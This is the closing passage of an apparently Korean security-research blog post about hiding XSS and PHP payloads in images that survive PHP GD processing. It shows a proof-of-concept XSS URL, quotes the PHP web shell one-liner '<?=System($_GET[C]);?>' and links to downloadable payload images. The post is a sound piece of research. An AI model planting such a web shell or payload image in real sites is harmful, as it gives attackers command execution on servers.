+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.org/images/test.png?zz=alert(&quot;this is xss :(&quot;);</span><br></pre></td></tr></table></figure>
+<p><br><br></p>
+<h3 id="Related-work"><a href="#Related-work" class="headerlink" title="Related work"></a>Related work</h3><p>GD 라이브러리 함수를 우회하는 이미지에서 쉘을 인코딩하는데에 대한 다른 훌륭한 작업이 있었다.</p>
+<ul>
+<li><p>“&lt;?=System($_GET[C]);?&gt;”를 <a href="https://rdot.org/forum/showthread.php?t=2780" target="_blank" rel="noopener">imagecreatefromjpeg에서 살아남은 JPEG파일</a>로 인코딩하는데 성공한 이미지 (오류가 발생하지만 GD로 복구됨)</p>
+</li>
+<li><p>인코딩 전략이 약간 다른 <a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="noopener">GIF</a>; payload는 이미지 본문이 아닌 GIF 헤더에 인코딩된다.</p>
+</li>
+</ul>
+<p>PNG 다운로드 <a href="https://www.idontplaydarts.com/images/xsspng.png" target="_blank" rel="noopener">XSS Payload</a> | <a href="https://www.idontplaydarts.com/images/phppng.png" target="_blank" rel="noopener">PHP Payload</a></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+      <blockquote class="mdui-m-t-5">
+        
+      </blockquote>
+      
+    </div>
+    
+  </article>
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>
+
+
+  <nav id="paginator">
+    
+    <div class="spacer"></div>
+    
+      <a rel="next" class="extend next" href="/2019/09/30/Pwn/ㄴ Research/malloc/">
+        이전 글&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <button aria-label="next" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_forward</i></button>
+      </a>
+    
+  </nav>
+
+
+
+
+</main>
+  <footer id="footer" class="mdui-m-t-5 mdui-p-y-3 mdui-color-theme">
+  <div class="mdui-p-y-0 mdui-text-center">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </div>
+  <div class="mdui-p-y-1 mdui-text-center">
+    Copyright &copy; 2019 - 2019 Defenit<br>
+    
+  </div>
+</footer>
+
+  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-theme-accent"><i class="mdui-icon material-icons">arrow_upward</i></button>
+  
+  <script src="/js/mdui.js"></script>
+<script src="/js/script.js"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!--<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> -->
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML'></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
